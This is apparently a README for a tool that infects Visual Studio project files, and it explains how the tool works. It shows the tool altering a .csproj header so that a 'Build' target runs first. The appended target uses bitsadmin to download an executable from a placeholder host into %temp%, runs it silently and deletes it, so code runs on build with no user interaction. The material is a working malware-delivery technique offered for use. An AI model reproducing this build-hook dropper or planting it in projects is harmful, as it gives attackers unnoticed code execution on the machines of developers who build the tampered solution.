## Usage:



```cs
CreateInfectedSLN(Job(random Sting), Link(direct download), Filename(Name of file saved to temp));
```


## So what does this do?

```xml
This edits the file and adds a bit to it:
We change the 15 to 14 and add 'InitialTargets="Build"'
```

#### Clean .csproj:

```xml 
<Project ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
```
#### Modifed .csproj
```xml 
<Project ToolsVersion="14.0" InitialTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
 ```

 ### We then append this to the end of the file:
```xml
<Target Name="Build">
    <Exec Command="bitsadmin.exe /transfer JOSHN38N http://domain.com/filename.exe %temp%\Demo.exe">
      <Output TaskParameter="ExitCode" PropertyName="ErrorCode"/>
    </Exec>
    <Exec Command="%temp%\Demo.exe">
      <Output TaskParameter="ExitCode" PropertyName="ErrorCode"/>
    </Exec>
    <Exec Command="del %temp%\Demo.exe" >
      <Output TaskParameter="ExitCode" PropertyName="ErrorCode"/>
    </Exec>
    <Message Importance="high" Text="$(ErrorCode)"/>
    </Target> 
```
### Here is the biggest part: 

We use bitsadmin to assign a job that downloads and runs the process after its downloaded in the background and requires no user interaction.  
```xml
<Exec Command="bitsadmin.exe /transfer JOSHN38N http://domain.com/filename.exe %temp%\Demo.exe">
 ```
## Extra Example: 
```cs
/*Job = JOSHN38N;
Link = http://domain.com/filename.exe;
Filename = Demo.exe;*/
```
